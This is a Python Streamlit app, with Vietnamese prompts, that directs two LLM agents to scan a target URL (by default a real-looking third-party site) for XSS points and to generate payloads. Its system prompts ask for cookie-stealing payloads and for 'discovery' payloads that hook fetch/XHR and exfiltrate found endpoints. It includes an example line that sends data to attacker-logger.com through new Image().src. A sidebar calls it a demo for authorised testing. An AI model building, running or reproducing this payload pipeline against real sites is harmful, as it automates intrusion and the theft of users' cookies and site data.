import streamlit as st
import autogen
from dotenv import load_dotenv
import os
import json
import urllib.parse # Để URL encoding payload
import re

# Tải biến môi trường từ file .env
load_dotenv()

#Thông tin phiên được cung cấp từ người dùng
USER_PROVIDED_DATETIME_UTC = "2025-05-06 14:34:48"
USER_PROVIDED_LOGIN = "Khoalt0811"

#Biến toàn cục cho tên model
TARGET_DEEPSEEK_MODEL = "deepseek-coder"

#Biến để lưu trữ nội dung file văn bản
if 'text_report_content' not in st.session_state:
    st.session_state.text_report_content = None

def load_llm_config():
    """Tải cấu hình LLM từ agents_config.json và chèn API key thực tế."""
    config_path = "agents_config.json"

    actual_api_key = os.getenv("DEEPSEEK_API_KEY")
    if not actual_api_key:
        st.error("Lỗi: DEEPSEEK_API_KEY không được tìm thấy trong biến môi trường. "
                 "Hãy kiểm tra file .env và đảm bảo nó được tải đúng cách.")
        return None

    if not os.path.exists(config_path):
        st.error(f"Lỗi: File cấu hình '{config_path}' không tìm thấy.")
        return None

    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            config_data_list_from_file = json.load(f)

        processed_config_list = []
        model_configured_found = False
        for config_item_from_file in config_data_list_from_file:
            new_config_item = config_item_from_file.copy()
            if new_config_item.get("model") == TARGET_DEEPSEEK_MODEL:
                new_config_item["api_key"] = actual_api_key
                processed_config_list.append(new_config_item)
                model_configured_found = True
                break

        if not model_configured_found:
            st.error(f"Lỗi: Không tìm thấy cấu hình cho model '{TARGET_DEEPSEEK_MODEL}' trong '{config_path}'. "
                     f"Hãy đảm bảo file '{config_path}' chứa một entry cho model này.")
            return None
        if not processed_config_list:
             st.error(f"Lỗi: Danh sách cấu hình xử lý cho model '{TARGET_DEEPSEEK_MODEL}' bị rỗng sau khi xử lý.")
             return None

    except json.JSONDecodeError as e:
        st.error(f"Lỗi khi phân tích cú pháp JSON trong file '{config_path}': {e}. "
                 "Vui lòng kiểm tra xem file có phải là JSON hợp lệ không và được lưu với encoding UTF-8.")
        return None
    except Exception as e:
        st.error(f"Lỗi khi đọc hoặc xử lý file cấu hình LLM '{config_path}': {e}")
        return None

    return {
        "config_list": processed_config_list,
        "cache_seed": None,
        "timeout": 360, # Có thể tăng nếu các tác vụ phức tạp hơn
    }

def run_xss_analysis_and_discovery_with_autogen(target_url: str, known_injection_point: str, llm_config_dict: dict):
    st.session_state.text_report_content = None
    if not llm_config_dict or "config_list" not in llm_config_dict or not llm_config_dict["config_list"]:
        st.error("Lỗi nghiêm trọng: Cấu hình LLM không hợp lệ hoặc rỗng khi chạy agent.")
        return [{"name": "System Error", "content": "Không thể khởi tạo agent do lỗi cấu hình LLM."}]

    TERMINATION_PHRASE_TEXT = "HOÀN TẤT TẠO PAYLOAD VÀ HƯỚNG DẪN."
    TERMINATION_REGEX = re.compile(re.escape(TERMINATION_PHRASE_TEXT) + r"\s*$", re.IGNORECASE)

    user_proxy = autogen.UserProxyAgent(
        name="User_Proxy_Tieng_Viet",
        human_input_mode="NEVER",
        max_consecutive_auto_reply=1,
        is_termination_msg=lambda x: TERMINATION_REGEX.search(x.get("content", "").strip()) is not None,
        code_execution_config=False,
    )

    agent_llm_config = llm_config_dict.copy()

    injection_info = f"Hãy đặc biệt chú ý đến tham số/điểm chèn đã biết: '{known_injection_point}'." if known_injection_point else "Hãy cố gắng tự động phát hiện các điểm chèn."

    xss_analysis_agent = autogen.AssistantAgent(
        name="Chuyen_Gia_Phan_Tich_Va_Kham_Pha_XSS", # Đổi tên agent
        llm_config=agent_llm_config,
        system_message=f"""Bạn là một chuyên gia phân tích bảo mật web và khám phá lỗ hổng cao cấp của Việt Nam. Mọi phản hồi của bạn PHẢI bằng tiếng Việt.
Nhiệm vụ của bạn là:
1.  Nhận URL mục tiêu để phân tích: {target_url}.
2.  Thông tin bổ sung về điểm chèn (nếu có): {injection_info}
3.  Phân tích kỹ lưỡng URL này, bao gồm mã nguồn front-end, để tìm các điểm chèn XSS tiềm năng (Reflected, Stored, DOM).
4.  **Quan trọng - Khám phá Endpoint:** Suy nghĩ và đề xuất các kỹ thuật XSS có thể được sử dụng để khám phá các URL/endpoint ẩn hoặc không được liên kết trực tiếp trên cùng domain ({target_url}). Ví dụ:
    a.  Phân tích mã JavaScript nội bộ hoặc các file script bên ngoài để tìm các chuỗi URL.
    b.  Hook các hàm `XMLHttpRequest` hoặc `fetch` để ghi lại các AJAX request.
    c.  Phân tích DOM để tìm các URL trong các thuộc tính `href`, `action`, hoặc các thuộc tính `data-*`.
    d.  Duyệt các biến JavaScript toàn cục hoặc các đối tượng cấu hình có thể chứa URL API.
5.  Với mỗi điểm chèn XSS tiềm năng đã xác định:
    a.  Mô tả rõ ràng ngữ cảnh (context) và tên tham số (nếu có).
6.  Sau khi hoàn thành phân tích, hãy trình bày rõ ràng các phát hiện của bạn. Yêu cầu 'Chuyen_Gia_Tao_Payload_XSS_Kham_Pha' tạo hai loại payload:
    a.  Payload XSS tiêu chuẩn (ví dụ: alert, trộm cookie đơn giản).
    b.  Payload XSS khám phá (discovery payloads) dựa trên các kỹ thuật bạn đã đề xuất ở mục 4, với mục tiêu là gửi các URL/thông tin tìm thấy về một máy chủ do kẻ tấn công kiểm soát (ví dụ: `https://attacker-domain.com/log.php`).
Không tự ý kết thúc cuộc hội thoại.
"""
    )

    xss_payload_generator_agent = autogen.AssistantAgent(
        name="Chuyen_Gia_Tao_Payload_XSS_Kham_Pha",
        llm_config=agent_llm_config,
        system_message=f"""Bạn là một chuyên gia tạo payload XSS người Việt, chuyên về cả payload tấn công trực tiếp và payload khám phá. Mọi phản hồi PHẢI bằng tiếng Việt.
Nhiệm vụ của bạn là:
1.  Nhận yêu cầu và thông tin phân tích từ 'Chuyen_Gia_Phan_Tich_Va_Kham_Pha_XSS' về các điểm chèn trên {target_url} và các kỹ thuật khám phá endpoint.
2.  Đối với mỗi điểm chèn và ngữ cảnh được cung cấp, sinh ra 2-3 payload XSS **tiêu chuẩn** (ví dụ: hiển thị alert, trích xuất `document.cookie` cơ bản).
3.  Sinh thêm 2-4 payload XSS **khám phá nâng cao**. Các payload này phải:
    a.  Triển khai một hoặc nhiều kỹ thuật khám phá đã được 'Chuyen_Gia_Phan_Tich_Va_Kham_Pha_XSS' đề xuất (ví dụ: duyệt script, hook XHR/fetch, phân tích DOM, quét biến global).
    b.  Khi một URL hoặc thông tin thú vị được phát hiện (ví dụ, một URL chứa '/admin/', '/api/', 'ajax', 'internal'), payload phải cố gắng gửi thông tin đó về một máy chủ giả định của kẻ tấn công, ví dụ: `new Image().src = 'https://attacker-logger.com/found?data=' + encodeURIComponent(thong_tin_tim_thay);`.
    c.  Cung cấp giải thích rõ ràng về cách payload khám phá này hoạt động.
4.  **Với mỗi payload (cả tiêu chuẩn và khám phá), hãy cung cấp một báo cáo chi tiết bằng tiếng Việt theo cấu trúc sau:**
    ### Payload [Số thứ tự] - [LOẠI: Tiêu chuẩn/Khám phá] CHO [Tên Tham Số/Ngữ Cảnh trên {target_url}]
    **1. Payload:**
    ```html_or_javascript
    [CHÈN PAYLOAD TẠI ĐÂY]
    ```
    **2. Mục tiêu của Payload:** (Ví dụ: "Hiển thị alert", "Trộm cookie", "Khám phá URL AJAX trong mã nguồn JS", "Ghi lại các lệnh gọi fetch tới API")
    **3. Mô tả và Cách hoạt động:**
    (Giải thích chi tiết. Nếu là payload khám phá, giải thích nó tìm kiếm thông tin gì, ở đâu, và gửi đi như thế nào.)
    **4. Hướng dẫn sử dụng và URL/Cách thử nghiệm (áp dụng trên {target_url}):**
    (Cung cấp hướng dẫn. Ví dụ: `{target_url}?{known_injection_point if known_injection_point else 'param'}=[URL_ENCODED_PAYLOAD]`)
    **5. Mức độ hiệu quả dự kiến:** (Cao/Trung bình/Thấp)
5.  Sau khi cung cấp tất cả các payload, thêm phần hướng dẫn lưu báo cáo.
6.  Kết thúc bằng cụm từ: {TERMINATION_PHRASE_TEXT}
"""
    )

    group_chat = autogen.GroupChat(
        agents=[user_proxy, xss_analysis_agent, xss_payload_generator_agent],
        messages=[],
        max_round=20 # Có thể cần tăng nếu AI cần nhiều lượt hơn để phân tích và tạo payload khám phá
    )
    manager = autogen.GroupChatManager(groupchat=group_chat, llm_config=agent_llm_config)

    initial_message = f"""Chào các chuyên gia người Việt,
Hãy tiến hành phân tích lỗ hổng XSS và khám phá endpoint ẩn cho URL chính sau: {target_url}.
Thông tin điểm chèn đã biết (nếu có): '{known_injection_point}'.

Quy trình:
1.  'Chuyen_Gia_Phan_Tich_Va_Kham_Pha_XSS':
    *   Phân tích URL `{target_url}` (sử dụng thông tin điểm chèn đã biết nếu có).
    *   Xác định các điểm chèn XSS.
    *   Đề xuất các kỹ thuật XSS để khám phá các URL/endpoint ẩn trên cùng domain.
    *   Yêu cầu 'Chuyen_Gia_Tao_Payload_XSS_Kham_Pha' tạo cả payload XSS tiêu chuẩn và payload khám phá.
2.  'Chuyen_Gia_Tao_Payload_XSS_Kham_Pha':
    *   Tạo các payload XSS tiêu chuẩn cho các điểm chèn.
    *   Tạo các payload XSS khám phá dựa trên các kỹ thuật được đề xuất, với mục tiêu gửi thông tin tìm thấy về một máy chủ logger giả định.
    *   Cung cấp hướng dẫn chi tiết và kết thúc bằng "{TERMINATION_PHRASE_TEXT}".
Toàn bộ cuộc hội thoại và báo cáo cuối cùng phải bằng tiếng Việt.
"""

    user_proxy.initiate_chat(manager, message=initial_message)

    # Tổng hợp nội dung báo cáo
    full_report_for_download = f"# Báo Cáo Phân Tích XSS và Khám Phá Endpoint cho URL: {target_url}\n"
    full_report_for_download += f"Điểm chèn đã biết: {known_injection_point if known_injection_point else 'Không có'}\n\n"
    analysis_content = ""
    payload_content = ""

    if group_chat.messages:
        for msg in group_chat.messages:
            sender_name = msg.get("name")
            content = msg.get("content", "")

            if sender_name == xss_analysis_agent.name:
                analysis_content += f"## Phân Tích và Đề xuất Khám Phá Từ {xss_analysis_agent.name}:\n{content}\n\n---\n\n"
            elif sender_name == xss_payload_generator_agent.name:
                cleaned_payload_part = content.split("---")[0]
                payload_content += f"## Payloads Tiêu chuẩn và Khám Phá Từ {xss_payload_generator_agent.name}:\n{cleaned_payload_part.replace(TERMINATION_PHRASE_TEXT, '').strip()}\n\n"

    if analysis_content or payload_content:
        full_report_for_download += analysis_content + payload_content
        st.session_state.text_report_content = full_report_for_download.strip()


    return group_chat.messages


#Giao diện Streamlit
st.set_page_config(page_title="XSS Analyzer & Endpoint Discovery", layout="wide")

if 'current_date_utc' not in st.session_state:
    st.session_state.current_date_utc = USER_PROVIDED_DATETIME_UTC
if 'user_login' not in st.session_state:
    st.session_state.user_login = USER_PROVIDED_LOGIN

st.title("🎯 Công Cụ Phân Tích XSS & Khám Phá Endpoint AI")

col1, col2 = st.columns([3,1])
with col1:
    st.caption(f"Phân tích URL, tìm điểm yếu XSS, và tạo payload khám phá endpoint ẩn. Model: {TARGET_DEEPSEEK_MODEL}.")
with col2:
    st.markdown(f"<div style='text-align: right;'>Người dùng: <b>{st.session_state.user_login}</b><br>Thời gian (UTC): {st.session_state.current_date_utc}</div>", unsafe_allow_html=True)
st.markdown("---")

active_llm_config = load_llm_config()
if not active_llm_config:
    st.error("Không thể tải cấu hình LLM. Ứng dụng không thể tiếp tục.")
    st.stop()

st.sidebar.header("⚠️ Lưu Ý Quan Trọng")
st.sidebar.warning(
    """
    - **Đây là một công cụ DEMO.**
    - **KHÔNG THỰC HIỆN TẤN CÔNG TRÁI PHÉP.**
    - **Kết quả chỉ mang tính tham khảo.** Luôn cần kiểm tra thủ công.
    - **TRÁCH NHIỆM:** Chỉ sử dụng với các URL bạn được phép phân tích.
    - Các payload "khám phá" sẽ cố gắng gửi dữ liệu về một URL logger giả định (`https://attacker-logger.com/...`). Bạn cần thiết lập một logger thực sự để nhận dữ liệu này nếu muốn thử nghiệm đầy đủ.
    """
)
st.sidebar.header("Hướng dẫn sử dụng")
st.sidebar.info(
    f"""
    1. Đảm bảo file `.env` có `DEEPSEEK_API_KEY` và `agents_config.json` (UTF-8) được cấu hình đúng cho `{TARGET_DEEPSEEK_MODEL}`.
    2. Nhập URL chính bạn muốn phân tích (ví dụ: `https://tantanluc.com/`).
    3. (Tùy chọn) Nhập tên tham số hoặc mô tả điểm chèn XSS đã biết trên URL chính.
    4. Nhấn "Bắt đầu Phân Tích & Khám Phá".
    5. AI sẽ cố gắng tạo cả payload XSS thông thường và payload để khám phá các URL/endpoint khác trên cùng domain.
    6. Kiểm tra kỹ các payload được đề xuất và tự mình thử nghiệm trên URL chính.
    """
)
st.sidebar.markdown("---")

default_main_url = "https://tantanluc.com/"
main_target_url_input = st.text_input(
    "Nhập URL chính để phân tích và khám phá:",
    value=default_main_url
)
known_injection_param = st.text_input(
    "Tham số/Điểm chèn XSS đã biết trên URL chính (Tùy chọn, ví dụ: 'q', 'search', '#hashInput'):",
    help="Nếu để trống, AI sẽ cố gắng tự phát hiện."
)

if st.button("🔬 Bắt đầu Phân Tích & Khám Phá"):
    st.session_state.text_report_content = None
    valid_main_url = main_target_url_input and (main_target_url_input.startswith("http://") or main_target_url_input.startswith("https://"))

    if not valid_main_url:
        st.warning("Vui lòng nhập một URL chính hợp lệ.")
    elif not active_llm_config:
        st.error("Lỗi cấu hình LLM. Không thể tiến hành phân tích.")
    else:
        st.info(f"Đang khởi tạo phân tích và khám phá cho URL chính: {main_target_url_input}")
        st.info(f"Điểm chèn đã biết: {known_injection_param if known_injection_param else 'Sẽ tự động phát hiện'}")

        with st.spinner(f" Các Chuyên Gia AI đang làm việc với model {TARGET_DEEPSEEK_MODEL}... Quá trình này có thể cần nhiều thời gian hơn..."):
            try:
                conversation_log = run_xss_analysis_and_discovery_with_autogen(
                    main_target_url_input,
                    known_injection_param,
                    active_llm_config
                )

                st.markdown("---")
                st.subheader("📜 Nhật Ký Tương Tác & Kết Quả Phân Tích/Khám Phá của Chuyên Gia AI:")
                if conversation_log:
                    for i, msg in enumerate(conversation_log):
                        agent_name = msg.get('name', 'Unknown Agent')
                        if agent_name == "User_Proxy_Tieng_Viet": expander_title = f"👤 {agent_name} (Lượt {i+1})"
                        elif "Phan_Tich_Va_Kham_Pha" in agent_name: expander_title = f"🕵️ {agent_name} (Lượt {i+1})"
                        elif "Tao_Payload_XSS_Kham_Pha" in agent_name: expander_title = f"🛠️ {agent_name} (Lượt {i+1})"
                        elif agent_name == "System Error": expander_title = f"❌ {agent_name} (Lượt {i+1})"
                        else: expander_title = f"💬 {agent_name} (Lượt {i+1})"

                        is_expanded_default = True
                        with st.expander(expander_title, expanded=is_expanded_default):
                            content = msg.get('content', '')
                            st.markdown(content, unsafe_allow_html=True)
                else:
                    st.warning("Không có nhật ký trò chuyện nào được tạo ra hoặc quá trình bị lỗi.")

                if st.session_state.text_report_content:
                    st.download_button(
                        label="📥 Tải Báo Cáo Phân Tích & Khám Phá Tổng Hợp (.txt)",
                        data=st.session_state.text_report_content,
                        file_name=f"bao_cao_xss_discovery_{urllib.parse.quote_plus(main_target_url_input)}_{USER_PROVIDED_DATETIME_UTC.replace(':','-').replace(' ','_')}.txt",
                        mime="text/plain"
                    )

            except Exception as e:
                st.error(f"Đã xảy ra lỗi nghiêm trọng trong quá trình phân tích: {e}")
                st.exception(e)

st.markdown("---")
st.markdown(f"Ứng dụng demo được phát triển bởi AI Copilot theo yêu cầu của **{st.session_state.user_login}**.")
st.caption(f"Phiên làm việc ngày (UTC): {st.session_state.current_date_utc}")